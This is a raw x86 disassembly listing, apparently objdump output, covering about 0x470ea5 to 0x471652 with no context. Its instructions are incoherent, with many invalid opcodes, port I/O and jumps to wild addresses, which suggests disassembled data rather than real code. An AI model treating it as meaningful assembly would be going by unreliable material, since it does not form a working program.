  470ea5:	jecxz  0x470eea
  470ea7:	or     al,0x6d
  470ea9:	xor    ah,cl
  470eab:	xor    DWORD PTR [ebp+0x22302c66],eax
  470eb1:	jnp    0x470ec3
  470eb3:	adc    al,0x1c
  470eb5:	mov    al,ds:0xc59de2bf
  470eba:	dec    edx
  470ebb:	sub    BYTE PTR [ebx+0x1075166b],cl
  470ec1:	cmp    esi,DWORD PTR [ebp+0x4]
  470ec4:	je     0x470ed0
  470ec6:	imul   esp,ebp,0x6b
  470ec9:	jo     0x470f39
  470ecb:	push   esi
  470ecc:	cmp    eax,0xdc2f6c40
  470ed1:	jne    0x470ed6
  470ed3:	retf   0xb4a8
  470ed6:	jae    0x470f4a
  470ed8:	adc    dh,bl
  470eda:	add    eax,0xc005baf0
  470edf:	loope  0x470e9f
  470ee1:	sbb    cl,BYTE PTR [eax-0x2d]
  470ee4:	adc    DWORD PTR [ecx-0x1f8f2ffb],esp
  470eea:	scas   eax,DWORD PTR es:[edi]
  470eeb:	jmp    0x874d12ba
  470ef0:	icebp  
  470ef1:	push   0x6ed3fb43
  470ef6:	xor    dh,cl
  470ef8:	std    
  470ef9:	or     edi,eax
  470efb:	push   es
  470efc:	out    dx,al
  470efd:	mov    ds:0xc3ac5745,eax
  470f02:	nop
  470f03:	pop    DWORD PTR ds:0xe5414d75
  470f09:	xchg   esi,eax
  470f0a:	jmp    0xc819219a
  470f0f:	pop    esp
  470f10:	pop    edx
  470f11:	call   0x4a500ef1
  470f16:	clc    
  470f17:	dec    ecx
  470f18:	jl     0x470f2a
  470f1a:	lock dec DWORD PTR [esi*2+0x428d500a]
  470f22:	fist   DWORD PTR [esp+edi*8-0x12]
  470f26:	and    BYTE PTR [ebx],ah
  470f28:	outs   dx,BYTE PTR ds:[esi]
  470f29:	addr16 (bad) 
  470f2b:	mov    edx,DWORD PTR [ebx]
  470f2d:	push   edx
  470f2e:	sbb    al,bh
  470f30:	add    eax,DWORD PTR [ebx+0xe872ec2]
  470f36:	or     BYTE PTR [ecx-0xe],dl
  470f39:	jle    0x470f3e
  470f3b:	lods   eax,DWORD PTR ds:[esi]
  470f3c:	jne    0x470f8c
  470f3e:	jne    0x470f1a
  470f40:	pop    esi
  470f41:	xchg   esi,eax
  470f42:	inc    edx
  470f43:	inc    ecx
  470f44:	jg     0x470f60
  470f46:	fidiv  DWORD PTR [edi]
  470f48:	inc    eax
  470f49:	daa    
  470f4a:	mov    BYTE PTR [edx+0x79],al
  470f4d:	xor    al,0x68
  470f4f:	mov    edx,eax
  470f51:	pop    eax
  470f52:	push   ss
  470f53:	dec    eax
  470f54:	pop    eax
  470f55:	xlat   BYTE PTR ds:[ebx]
  470f56:	in     al,dx
  470f57:	push   edi
  470f58:	sbb    al,0x44
  470f5a:	pop    edx
  470f5b:	pop    eax
  470f5c:	jmp    0x470f62
  470f5e:	jbe    0x470fcc
  470f60:	xchg   edi,esi
  470f62:	adc    al,0x97
  470f64:	inc    edx
  470f65:	lods   eax,DWORD PTR ds:[esi]
  470f66:	repnz add eax,0x537e0a87
  470f6c:	(bad)  
  470f6d:	hlt    
  470f6e:	mov    edi,0x247ef737
  470f73:	push   eax
  470f74:	add    eax,0xa
  470f77:	and    eax,0xfffffffe
  470f7a:	push   eax
  470f7b:	inc    ebx
  470f7c:	pop    edx
  470f7d:	or     eax,DWORD PTR [eax]
  470f7f:	xchg   ecx,eax
  470f80:	icebp  
  470f81:	mov    WORD PTR [edx+eax*1+0x42],0x5a12
  470f88:	mov    DWORD PTR [esi+ebx*1+0x28],eax
  470f8c:	rcl    BYTE PTR [eax-0x4],0x7c
  470f90:	clc    
  470f91:	mov    ebp,0xc1f8273e
  470f96:	mov    bh,0x57
  470f98:	cwde   
  470f99:	mov    edi,ecx
  470f9b:	mov    eax,edi
  470f9d:	das    
  470f9e:	stc    
  470f9f:	mov    eax,esi
  470fa1:	rol    DWORD PTR [edx+0x9eac787],0x3e
  470fa8:	mov    eax,esi
  470faa:	cmp    DWORD PTR [ecx-0x4bb50e28],ecx
  470fb0:	adc    DWORD PTR [ecx-0x6158c477],eax
  470fb6:	mov    dl,0xe1
  470fb8:	pop    ebp
  470fb9:	(bad)  
  470fba:	out    0x52,al
  470fbc:	push   eax
  470fbd:	dec    esi
  470fbe:	or     BYTE PTR [eax+0x51],dl
  470fc1:	push   0xffffffd4
  470fc3:	mov    esp,0x2d2f6a85
  470fc8:	jo     0x470f8a
  470fca:	mov    WORD PTR [esi+0x37],?
  470fcd:	loopne 0x47102f
  470fcf:	(bad)  
  470fd0:	in     eax,0xa0
  470fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  470fd3:	add    esp,0x2bb6ff80
  470fd9:	mov    ds:0xcac43aab,al
  470fde:	icebp  
  470fdf:	push   esi
  470fe0:	clc    
  470fe1:	fdivr  DWORD PTR [edi+0x9]
  470fe4:	fwait
  470fe5:	cmc    
  470fe6:	fild   QWORD PTR [esi]
  470fe8:	icebp  
  470fe9:	(bad)  
  470fea:	jmp    0x47104b
  470fec:	lea    ebp,[esi+0x1]
  470fef:	cmp    ebp,0x288e07ff
  470ff5:	push   esi
  470ff6:	sar    BYTE PTR [eax+0x1e6c0bc0],0xba
  470ffd:	add    bh,BYTE PTR [esi]
  470fff:	test   al,0xc1
  471001:	les    esi,FWORD PTR [edi]
  471003:	(bad)  
  471004:	out    0x7c,al
  471006:	pxor   mm7,QWORD PTR [edi]
  471009:	add    DWORD PTR [edi+0x67],esi
  47100c:	(bad)  
  47100d:	mov    ecx,ebx
  47100f:	imul   ebp,DWORD PTR [ebx+ecx*4],0xffffffdd
  471013:	add    ebx,ebx
  471015:	sbb    al,0xd3
  471017:	iret   
  471018:	push   ebp
  471019:	jns    0x47101c
  47101b:	dec    ebx
  47101c:	fiadd  DWORD PTR [edi]
  47101e:	sbb    edx,DWORD PTR gs:[ecx-0x48]
  471022:	mov    ah,0x67
  471024:	pop    edi
  471025:	jge    0x471029
  471027:	xor    edi,DWORD PTR ds:0xfc39e9f8
  47102d:	test   DWORD PTR [edi+edi*8-0x461d76ae],esp
  471034:	or     DWORD PTR [ebx+0x761ff005],ecx
  47103a:	ss xor ecx,ecx
  47103d:	mov    ds:0xa3a5221,al
  471042:	je     0x47105b
  471044:	sbb    al,ah
  471046:	push   0x896226e
  47104b:	add    dh,BYTE PTR [ebx+ecx*1+0x3]
  47104f:	retf   0xfdc1
  471052:	jbe    0x471059
  471054:	pusha  
  471055:	jmp    0x47103f
  471057:	inc    edx
  471058:	add    BYTE PTR [ecx-0x2ed6a52f],cl
  47105e:	jmp    0xf6faefc0
  471063:	iret   
  471064:	(bad)  
  471065:	pop    edi
  471066:	sub    eax,0x603b6652
  47106b:	and    BYTE PTR [eax],cl
  47106d:	pop    eax
  47106e:	pop    ss
  47106f:	or     al,BYTE PTR [esp+esi*2]
  471072:	pop    esi
  471073:	(bad)  
  471074:	out    dx,al
  471075:	sahf   
  471076:	push   cs
  471077:	push   es
  471078:	addr16 or bl,ch
  47107b:	in     al,0x8
  47107d:	add    al,BYTE PTR ds:0x91ef4373
  471083:	iret   
  471084:	je     0x4710fc
  471086:	xor    eax,0x420a8a00
  47108b:	xchg   ebx,eax
  47108c:	add    BYTE PTR [edi+0x50168300],cl
  471092:	jp     0x471086
  471094:	scas   al,BYTE PTR es:[edi]
  471095:	sub    bh,BYTE PTR [esi-0x2e1fe814]
  47109b:	pop    eax
  47109c:	add    ecx,eax
  47109e:	pop    eax
  47109f:	pop    edi
  4710a0:	xor    DWORD PTR [edi+0x1dfcc205],edi
  4710a6:	fidiv  DWORD PTR [ebp-0x29]
  4710a9:	outs   dx,DWORD PTR ds:[esi]
  4710aa:	push   ebx
  4710ab:	and    al,0x7e
  4710ad:	pop    edx
  4710ae:	cld    
  4710af:	repnz adc DWORD PTR [edi],esi
  4710b2:	add    DWORD PTR [ebx+0x7cd939ec],edi
  4710b8:	scas   al,BYTE PTR es:[edi]
  4710b9:	in     al,0x8
  4710bb:	inc    eax
  4710bc:	adc    eax,esi
  4710be:	and    al,BYTE PTR ds:0x3f96042c
  4710c4:	mov    esp,0x35f0de2
  4710c9:	out    dx,eax
  4710ca:	inc    eax
  4710cb:	cld    
  4710cc:	ret    
  4710cd:	push   esp
  4710ce:	aas    
  4710cf:	test   BYTE PTR [edi],0x84
  4710d2:	jle    0x471074
  4710d4:	inc    DWORD PTR [edi+edi*4]
  4710d7:	loope  0x4710ee
  4710d9:	retf   
  4710da:	mov    edi,DWORD PTR [ecx-0x16]
  4710dd:	push   esi
  4710de:	cld    
  4710df:	add    edx,edi
  4710e1:	cmp    esi,ecx
  4710e3:	pop    esp
  4710e4:	cmp    al,0x6b
  4710e6:	sub    ebx,DWORD PTR [esi]
  4710e8:	and    esi,eax
  4710ea:	mov    ecx,DWORD PTR [esi+0x24]
  4710ed:	adc    esp,DWORD PTR [edx]
  4710ef:	mov    DWORD PTR [edx+0x2f39e362],eax
  4710f5:	sub    eax,0x8e6f900
  4710fa:	(bad)  
  4710fb:	shl    DWORD PTR [ebp-0x79],cl
  4710fe:	popa   
  4710ff:	cmp    DWORD PTR [ebx+edi*1],0x10
  471103:	je     0x471161
  471105:	cmp    ecx,DWORD PTR [eax]
  471107:	mov    esi,0x4b6881ee
  47110c:	div    DWORD PTR [ebx]
  47110e:	clc    
  47110f:	sub    dh,BYTE PTR fs:[esi]
  471112:	ins    BYTE PTR es:[edi],dx
  471113:	scas   eax,DWORD PTR es:[edi]
  471114:	inc    ebp
  471115:	pop    ss
  471116:	mov    ebp,0xce89d3e2
  47111b:	loopne 0x471160
  47111d:	cld    
  47111e:	add    eax,DWORD PTR [esi-0x4f]
  471121:	(bad)  
  471122:	mov    ah,0x89
  471124:	fldlg2 
  471126:	ja     0x47110c
  471128:	fmul   DWORD PTR [ebx-0x3a0576b5]
  47112e:	add    edx,DWORD PTR [ebx+0x1d]
  471131:	pop    eax
  471132:	push   ds
  471133:	out    dx,al
  471134:	out    dx,al
  471135:	lods   eax,DWORD PTR ds:[esi]
  471136:	pop    edx
  471137:	rol    BYTE PTR [edx-0x1e7407b1],1
  47113d:	mov    edx,ecx
  47113f:	jmp    0x30e47e5
  471144:	retf   
  471145:	mov    edx,ecx
  471147:	push   ds
  471148:	jle    0x4710f0
  47114a:	xor    edi,edi
  47114c:	test   eax,0x8e2b0ab4
  471151:	xchg   esp,eax
  471152:	adc    al,0x28
  471154:	or     al,0x39
  471156:	sbb    al,0xdb
  471158:	fwait
  471159:	loope  0x471172
  47115b:	cmp    cl,BYTE PTR [ebx-0x14b503bf]
  471161:	add    cl,BYTE PTR [esi+0x2b]
  471164:	or     DWORD PTR [ebx],eax
  471166:	push   ds
  471167:	cmp    edi,ecx
  471169:	adc    ah,ch
  47116b:	fisttp QWORD PTR [esp+eiz*2]
  47116e:	dec    esp
  47116f:	dec    edx
  471170:	jne    0x47115e
  471172:	mov    ds:0xff07e617,al
  471177:	adc    edi,esp
  471179:	inc    eax
  47117a:	ja     0x471178
  47117c:	jge    0x4711ba
  47117e:	and    al,0xff
  471180:	aaa    
  471181:	add    esi,DWORD PTR [edi]
  471183:	dec    ebx
  471184:	jmp    0x47118e
  471186:	and    ecx,DWORD PTR [edi+0xf]
  471189:	pop    edi
  47118a:	test   al,0x50
  47118c:	mov    esi,0x89189c44
  471191:	repnz ss or ah,dh
  471195:	add    DWORD PTR [ebx+eax*2],esi
  471198:	lock or esi,0x17
  47119c:	dec    ebx
  47119d:	jne    0x471188
  47119f:	mov    ch,BYTE PTR [eax]
  4711a1:	or     al,0x3f
  4711a3:	sbb    BYTE PTR [ecx],ch
  4711a5:	sbb    ah,cl
  4711a7:	and    cl,BYTE PTR [edx+0x5a]
  4711aa:	and    al,0x58
  4711ac:	lea    esp,[esp+edx*4]
  4711af:	les    edi,FWORD PTR [ecx-0x1f003c80]
  4711b5:	xchg   esi,eax
  4711b6:	mov    bh,0x39
  4711b8:	rcl    BYTE PTR [edi],1
  4711ba:	jl     0x47120b
  4711bc:	pop    edi
  4711bd:	outs   dx,DWORD PTR ds:[esi]
  4711be:	sub    al,0x68
  4711c0:	(bad)  
  4711c1:	imul   ecx,DWORD PTR [ebx-0x3a8742e],0x5c
  4711c8:	xor    dh,BYTE PTR [ebp+0x1]
  4711cb:	iret   
  4711cc:	pop    eax
  4711cd:	dec    ebx
  4711ce:	xor    al,0x4d
  4711d0:	ja     0x471152
  4711d2:	and    dl,BYTE PTR [edi+0x38]
  4711d5:	inc    ecx
  4711d6:	pop    ss
  4711d7:	push   eax
  4711d8:	jecxz  0x471230
  4711da:	add    eax,0x100c3ab6
  4711df:	and    ebx,0xdde02eea
  4711e5:	shl    DWORD PTR [eax+0xa],0x70
  4711e9:	daa    
  4711ea:	fidiv  DWORD PTR [ecx+0x1]
  4711ed:	ja     0x4711ae
  4711ef:	and    eax,ecx
  4711f1:	jmp    0x47120f
  4711f3:	aam    0xc
  4711f5:	not    DWORD PTR [esi+ebx*2+0x3f]
  4711f9:	pop    eax
  4711fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4711fb:	push   eax
  4711fc:	clc    
  4711fd:	inc    edx
  4711fe:	das    
  4711ff:	lods   al,BYTE PTR ds:[esi]
  471200:	data16 add BYTE PTR [esi-0x3cfd9859],bh
  471207:	add    BYTE PTR [eax+0x2e3a986d],bh
  47120d:	lds    edx,FWORD PTR [ebp+0x74384b5e]
  471213:	xor    dl,BYTE PTR [ebx-0x2]
  471216:	cmc    
  471217:	mov    dl,0xe1
  471219:	jp     0x4711ac
  47121b:	mov    esi,0x58fb5013
  471220:	adc    dh,ch
  471222:	mov    BYTE PTR [esi+eiz*8-0x73],dl
  471226:	dec    eax
  471227:	inc    eax
  471228:	es pop ebx
  47122a:	mov    eax,edx
  47122c:	or     BYTE PTR [ebx],dh
  47122e:	add    ah,BYTE PTR [bx+0x38]
  471232:	jo     0x471243
  471234:	(bad)  
  471235:	aaa    
  471236:	cli    
  471237:	inc    ebx
  471238:	fisubr WORD PTR ds:0x2607588b
  47123e:	dec    edx
  47123f:	jl     0x47125c
  471241:	cmp    edx,ebx
  471243:	jge    0x471264
  471245:	sub    ebx,edx
  471247:	xor    BYTE PTR [eax+ebp*1],ch
  47124a:	adc    BYTE PTR [esi+0x117f7219],bh
  471250:	push   ds
  471251:	sub    eax,0x2dd4abfa
  471256:	xor    BYTE PTR [ecx],dl
  471258:	xor    edx,edx
  47125a:	jmp    0x471241
  47125c:	inc    edx
  47125d:	jmp    0x47124a
  47125f:	scas   al,BYTE PTR es:[edi]
  471260:	adc    DWORD PTR [eax-0x4b],0xc45bbc25
  471267:	fistp  QWORD PTR [esi-0x72]
  47126a:	int3   
  47126b:	aaa    
  47126c:	int3   
  47126d:	cmp    BYTE PTR [edx+ecx*8+0x2a7c4e30],dh
  471274:	mov    dh,0xe2
  471276:	or     eax,0x267d288b
  47127b:	mov    esp,0xf129227e
  471280:	mov    dl,0x7e
  471282:	add    al,BYTE PTR [eax-0x1f]
  471285:	ret    
  471286:	push   cs
  471287:	(bad)  
  471288:	sub    ecx,edi
  47128a:	add    edx,esi
  47128c:	lea    eax,[edi+edx*1]
  47128f:	inc    edi
  471290:	dec    esi
  471291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  471292:	push   edx
  471293:	xlat   BYTE PTR ds:[ebx]
  471294:	xor    DWORD PTR [edx+0x394f1691],0x9f560cf0
  47129e:	(bad)  
  47129f:	iret   
  4712a0:	loop   0x47123b
  4712a2:	cdq    
  4712a3:	mov    edx,DWORD PTR [edx]
  4712a5:	push   edx
  4712a6:	mov    eax,DWORD PTR [edi+ecx*2+0x7d]
  4712aa:	sub    cl,ah
  4712ac:	outs   dx,DWORD PTR ds:[esi]
  4712ad:	(bad)  
  4712ae:	fistp  QWORD PTR [ecx]
  4712b0:	xlat   BYTE PTR ds:[ebx]
  4712b1:	adc    bh,0x8b
  4712b4:	imul   edi,esp,0xfffffff8
  4712b7:	add    edx,ebp
  4712b9:	gs pop eax
  4712bb:	cmp    eax,ebx
  4712bd:	or     edx,DWORD PTR [ebx+eax*4-0x41]
  4712c1:	mov    bx,WORD PTR [esi]
  4712c4:	mov    eax,DWORD PTR [esi]
  4712c6:	lea    edx,[edi+ebp*1]
  4712c9:	lock sbb al,0x54
  4712cc:	add    eax,edi
  4712ce:	push   ebx
  4712cf:	adc    DWORD PTR [ecx-0x16574100],esi
  4712d5:	add    ecx,DWORD PTR [edx+0x356be1d7]
  4712db:	xchg   DWORD PTR [eax-0x64],eax
  4712de:	xor    edi,edi
  4712e0:	stos   DWORD PTR es:[edi],eax
  4712e1:	in     eax,dx
  4712e2:	aas    
  4712e3:	std    
  4712e4:	mov    ecx,DWORD PTR [edi-0x4]
  4712e7:	push   edi
  4712e8:	ins    BYTE PTR es:[edi],dx
  4712e9:	dec    edx
  4712ea:	js     0x471307
  4712ec:	mov    al,BYTE PTR [esi]
  4712ee:	inc    esi
  4712ef:	jb     0x47136f
  4712f1:	adc    al,0x58
  4712f3:	and    BYTE PTR [edx+0x1],bh
  4712f6:	out    dx,eax
  4712f7:	adc    BYTE PTR [ecx-0x4d2ec735],cl
  4712fd:	inc    esp
  4712fe:	aaa    
  4712ff:	shl    BYTE PTR [ecx],0x7a
  471302:	retf   0x5aec
  471305:	fsub   QWORD PTR ss:[eax+0x12f8895a]
  47130c:	lods   al,BYTE PTR ds:[esi]
  47130d:	and    dl,BYTE PTR [edx+eiz*2]
  471310:	call   edi
  471312:	iret   
  471313:	shl    BYTE PTR [ecx],1
  471315:	or     BYTE PTR [esi],bl
  471317:	adc    al,0x48
  471319:	out    0xac,al
  47131b:	and    edx,DWORD PTR [esi*2+0x7883ff02]
  471322:	clc    
  471323:	add    DWORD PTR [ebp+0x1d],esi
  471326:	sub    eax,0x22
  471329:	or     DWORD PTR [esi],ebp
  47132b:	loopne 0x4712e5
  47132d:	mov    ds:0x74d73b02,al
  471332:	pop    eax
  471333:	sub    al,0x89
  471335:	and    dh,BYTE PTR [eax-0x4]
  471338:	(bad)  
  471339:	mov    ebp,0xfcc5864d
  47133e:	jmp    0x471368
  471340:	out    dx,al
  471341:	(bad)  
  471342:	arpl   WORD PTR [edx],bp
  471344:	jo     0x47133b
  471346:	mov    al,ds:0x395efad0
  47134b:	icebp  
  47134c:	(bad)  
  47134e:	pop    ds
  47134f:	add    DWORD PTR [edi],esi
  471351:	xchg   ebp,eax
  471352:	mov    al,0x5d
  471354:	ret    
  471355:	push   ebp
  471356:	test   al,0x70
  471358:	mov    WORD PTR [ecx-0x1b3d2f51],?
  47135e:	xchg   esi,eax
  47135f:	push   eax
  471360:	outs   dx,BYTE PTR ds:[esi]
  471361:	prefetchnta BYTE PTR [edi]
  471364:	push   ebx
  471365:	push   es
  471366:	push   edx
  471367:	das    
  471368:	sub    DWORD PTR [ebx-0x41381ee4],edi
  47136e:	push   cs
  47136f:	push   eax
  471370:	sub    eax,0x7823be11
  471375:	mul    DWORD PTR [edi-0x7658f31b]
  47137b:	aad    0x8
  47137d:	out    dx,eax
  47137e:	push   eax
  47137f:	cmp    DWORD PTR [ebx+0x1da7a7e8],ecx
  471385:	loopne 0x47133b
  471387:	shr    BYTE PTR [esi-0x4eebd444],cl
  47138d:	inc    eax
  47138e:	test   eax,0x5851aa74
  471393:	in     eax,0xd8
  471395:	jno    0x4713a5
  471397:	nop
  471398:	pop    ds
  471399:	push   esp
  47139a:	(bad)  
  47139b:	cmp    al,BYTE PTR [ebx+ebp*8+0x5fe0075d]
  4713a2:	repnz pop esp
  4713a4:	in     al,0x7e
  4713a6:	cmp    esi,DWORD PTR [eax-0x15]
  4713a9:	sub    cl,BYTE PTR [ebx-0x6fe6f623]
  4713af:	push   ebx
  4713b0:	ret    
  4713b1:	cmp    al,0xcc
  4713b3:	in     al,0x3c
  4713b5:	shr    BYTE PTR [ecx],0xc9
  4713b8:	cmp    al,0xcc
  4713ba:	ss jbe 0x4713c9
  4713bd:	push   DWORD PTR [edi]
  4713bf:	pop    ecx
  4713c1:	adc    al,0x4a
  4713c3:	push   eax
  4713c4:	das    
  4713c5:	int3   
  4713c6:	(bad)  
  4713c7:	pop    edx
  4713c8:	push   DWORD PTR [edx]
  4713ca:	add    ebp,DWORD PTR [edx]
  4713cc:	xor    bl,al
  4713ce:	mov    DWORD PTR [edx],eax
  4713d0:	and    edx,DWORD PTR [eax+0x70c3b8f]
  4713d6:	add    al,0x28
  4713d8:	pop    es
  4713d9:	add    ebx,DWORD PTR [edx]
  4713db:	and    cl,ah
  4713dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4713de:	mul    bl
  4713e0:	cmp    ah,ah
  4713e2:	outs   dx,DWORD PTR ds:[esi]
  4713e3:	add    al,0xa
  4713e5:	add    dl,bh
  4713e7:	jmp    0x1705:0xe6d7034b
  4713ee:	add    eax,0x7497e8d1
  4713f3:	cmp    DWORD PTR [edx-0x62],eax
  4713f6:	scas   eax,DWORD PTR es:[edi]
  4713f7:	jb     0x471387
  4713f9:	push   ecx
  4713fa:	push   esp
  4713fb:	inc    ecx
  4713fc:	and    al,BYTE PTR [eax+edx*4]
  4713ff:	add    DWORD PTR [esi+esi*1],esi
  471402:	cmp    al,0x5f
  471404:	fwait
  471405:	pop    ecx
  471406:	test   BYTE PTR [edi+ebx*1],0x66
  47140a:	pusha  
  47140b:	and    DWORD PTR ds:0x8c8eeae5,ebx
  471411:	push   ss
  471412:	cvtps2pd xmm5,QWORD PTR [edi]
  471415:	or     DWORD PTR [ebx+0x8],ebx
  471418:	push   edx
  471419:	popa   
  47141a:	rcl    DWORD PTR [edi+ebx*1],1
  47141d:	ss mov esi,0x5ce12343
  471423:	stc    
  471424:	das    
  471425:	(bad)  
  471426:	mov    bh,0xf0
  471428:	cmp    ebx,0x1
  47142b:	jge    0x47144b
  47142d:	or     al,0xbf
  47142f:	adc    BYTE PTR [edi+eax*1-0x6f3cc4b5],bh
  471436:	pushf  
  471437:	jmp    ebx
  471439:	ret    
  47143a:	std    
  47143b:	call   0xc372a65c
  471440:	cmp    edi,eax
  471442:	push   ds
  471443:	lods   al,BYTE PTR ds:[esi]
  471444:	add    edx,edx
  471446:	adc    eax,0xfa02e2ee
  47144b:	dec    ebp
  47144c:	or     BYTE PTR [ecx-0x4f6d6feb],dl
  471452:	adc    al,0xdc
  471454:	(bad)  
  471455:	pop    edi
  471456:	push   ecx
  471457:	lea    esp,[ecx]
  471459:	(bad)  
  47145b:	add    bh,BYTE PTR [eax+0x3a1d2962]
  471461:	pop    esp
  471462:	lock push es
  471464:	popa   
  471465:	fadd   QWORD PTR [ebp+0x1408b378]
  47146b:	cmp    ebx,eax
  47146d:	xchg   BYTE PTR [ebx+0x38da10ea],bl
  471473:	add    ecx,ecx
  471475:	cs push es
  471477:	xchg   ebp,eax
  471478:	(bad)  
  471479:	push   ss
  47147a:	(bad)  
  47147b:	xor    BYTE PTR [esi],ah
  47147d:	mov    edx,0xfe8a7457
  471482:	push   ebx
  471483:	mov    cl,BYTE PTR [edx+0x1]
  471486:	push   es
  471487:	das    
  471488:	rcr    BYTE PTR [ebp+0x11748d51],0x92
  47148f:	jl     0x4714a2
  471491:	push   es
  471492:	mov    ecx,DWORD PTR [eax+0x6e54157]
  471498:	adc    ah,BYTE PTR [edi+edi*1+0x7aa45d3d]
  47149f:	lea    eax,[edx+ebp*4+0x7f]
  4714a3:	out    0x37,eax
  4714a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4714a6:	mov    bl,bl
  4714a8:	inc    edx
  4714a9:	sbb    bh,dl
  4714ab:	cs (bad) 
  4714ad:	out    dx,eax
  4714ae:	push   esi
  4714af:	add    DWORD PTR [esi+0x457ffff1],ecx
  4714b5:	cmp    al,0x82
  4714b7:	and    bh,BYTE PTR [ebx+ecx*1]
  4714ba:	je     0x4714da
  4714bc:	cmp    al,0xc
  4714be:	je     0x4714e4
  4714c0:	cmp    al,0xd
  4714c2:	je     0x4714f7
  4714c4:	cmp    al,0xe
  4714c6:	je     0x471515
  4714c8:	cmp    al,0xf
  4714ca:	pop    eax
  4714cb:	sbb    BYTE PTR [eax],al
  4714cd:	pop    edi
  4714ce:	xchg   edx,eax
  4714cf:	cmp    al,0x11
  4714d1:	je     0x4714dd
  4714d3:	mov    al,0x2
  4714d5:	(bad)  [esi+0x27]
  4714d8:	loopne 0x4714b5
  4714da:	and    bl,BYTE PTR [eax+0x1245ebf8]
  4714e0:	mov    DWORD PTR [ebx+0x4],ecx
  4714e3:	ja     0x4714c2
  4714e5:	mov    ah,0xa6
  4714e7:	add    al,0x8
  4714e9:	or     al,0x24
  4714eb:	adc    bh,ch
  4714ed:	jmp    0x471521
  4714ef:	call   0x7058:0x2b548bd5
  4714f6:	shr    DWORD PTR [esi],cl
  4714f8:	or     al,ah
  4714fa:	add    ebx,DWORD PTR [esi+ebp*1+0x70]
  4714fe:	dec    esp
  4714ff:	cs push ss
  471501:	adc    bh,bh
  471503:	rcr    DWORD PTR [ebp-0x17c72423],cl
  471509:	pop    ebp
  47150a:	jmp    0x471520
  47150c:	cmp    dh,BYTE PTR [ebx]
  47150e:	mov    edx,esi
  471510:	sub    edx,DWORD PTR [edx+esi*8]
  471513:	stos   BYTE PTR es:[edi],al
  471514:	and    BYTE PTR [edi-0x10],dl
  471517:	pop    edi
  471518:	xchg   DWORD PTR [esi],edi
  47151a:	and    al,0x1b
  47151c:	jecxz  0x471549
  47151e:	sub    al,0x80
  471520:	pop    ss
  471521:	cmp    DWORD PTR ds:0xff07f70c,0x25
  471528:	icebp  
  471529:	aad    0xbb
  47152b:	adc    eax,0x10b0c311
  471530:	call   0x9f4098c4
  471535:	push   cs
  471536:	inc    edx
  471537:	adc    DWORD PTR [ebx-0x20],0x25bec3fd
  47153e:	data16 sahf 
  471540:	out    0x79,eax
  471542:	ds push ecx
  471544:	pop    esp
  471545:	jbe    0x47159f
  471547:	jnp    0x4715a7
  471549:	adc    ebx,DWORD PTR [esp+eax*4-0x2d74f13a]
  471550:	jmp    0x7fbb9a53
  471555:	pop    edi
  471556:	pop    ebx
  471557:	add    esp,ecx
  471559:	jg     0x471565
  47155b:	dec    ebp
  47155c:	and    BYTE PTR [edi],bh
  47155e:	or     DWORD PTR [ecx-0x237e836],ecx
  471564:	fwait
  471565:	push   0xffffffb6
  471567:	cmp    DWORD PTR [edi],eax
  471569:	pop    ss
  47156a:	ja     0x47159f
  47156c:	cmp    bl,BYTE PTR [ebx+ebp*8-0x7cbc8d92]
  471573:	and    DWORD PTR [esi],0x6
  471576:	dec    edi
  471577:	or     al,0x10
  471579:	repz jmp 0x4715db
  47157c:	pop    esp
  47157d:	enter  0x4e5,0x3e
  471581:	and    al,0x41
  471583:	fcomp  DWORD PTR [ebp-0x14522fed]
  471589:	sub    eax,DWORD PTR [ebp+0x1c85ed04]
  47158f:	or     DWORD PTR [edi],esi
  471591:	addr16 data16 sbb al,0x3a
  471595:	and    DWORD PTR [ebx+0x58],eax
  471598:	icebp  
  471599:	jmp    0x4715a6
  47159b:	cmp    BYTE PTR [ecx-0x1a4d3d24],bh
  4715a1:	adc    eax,0xa0c1a426
  4715a6:	jl     0x4715e1
  4715a8:	jmp    0xbf5b3433
  4715ad:	add    al,BYTE PTR [ecx]
  4715af:	sbb    DWORD PTR [edi+eax*8],edx
  4715b2:	xor    eax,eax
  4715b4:	mov    al,BYTE PTR [ecx-0x25]
  4715b7:	pop    ebp
  4715b8:	fdiv   st,st(0)
  4715ba:	add    DWORD PTR [ebp+0x6fbc087c],ecx
  4715c0:	cld    
  4715c1:	or     al,0x4f
  4715c3:	clc    
  4715c4:	push   ecx
  4715c5:	push   es
  4715c6:	add    al,0x29
  4715c8:	ds sub al,0x74
  4715cb:	(bad)
  4715ce:	mov    dl,al
  4715d0:	add    eax,esi
  4715d2:	stc    
  4715d3:	mov    ah,0x47
  4715d5:	mov    bh,0x86
  4715d7:	aas    
  4715d8:	xchg   BYTE PTR [esi+0x12],ch
  4715db:	mov    cl,BYTE PTR [edx]
  4715dd:	cmp    cl,0x56
  4715e0:	xor    DWORD PTR [eax],ecx
  4715e2:	or     esi,DWORD PTR [ebp+edi*1+0x30]
  4715e6:	aaa    
  4715e7:	aaa    
  4715e8:	aaa    
  4715e9:	or     al,0x74
  4715eb:	dec    ecx
  4715ec:	or     eax,0x740e5574
  4715f1:	jo     0x4715b4
  4715f3:	imul   ebx,edx,0x10806079
  4715f9:	adc    DWORD PTR [eax+0xa28a022],ecx
  4715ff:	inc    edi
  471600:	pop    ebp
  471601:	xor    eax,0xc364302e
  471606:	mov    dh,0x16
  471608:	mov    esp,0x7debdf0b
  47160d:	and    DWORD PTR [edx],edi
  47160f:	push   ecx
  471610:	stc    
  471611:	leave  
  471612:	xchg   ecx,eax
  471613:	shr    BYTE PTR [ebp+ecx*4+0x3f],0x1c
  471618:	mov    eax,0xb9e25b10
  47161d:	loop   0x471661
  47161f:	repnz lock (bad) 
  471622:	call   0x4cbc1529
  471627:	jmp    0x4716a4
  471629:	aas    
  47162a:	in     al,dx
  47162b:	clc    
  47162c:	or     DWORD PTR [edi+0x40],eax
  47162f:	push   eax
  471630:	pop    eax
  471631:	jmp    0x47166e
  471633:	aas    
  471634:	add    dl,BYTE PTR cs:[ecx-0x38]
  471638:	popa   
  471639:	in     eax,dx
  47163a:	cwde   
  47163b:	jbe    0x4716b6
  47163d:	xor    al,0x30
  47163f:	and    dh,BYTE PTR [ebp+0x2c61c44a]
  471645:	xchg   ecx,ebx
  471647:	adc    DWORD PTR [esi],edi
  471649:	and    eax,0x3839443
  47164e:	cld    
  47164f:	retf   0xecde
  471652:	dec    ebp
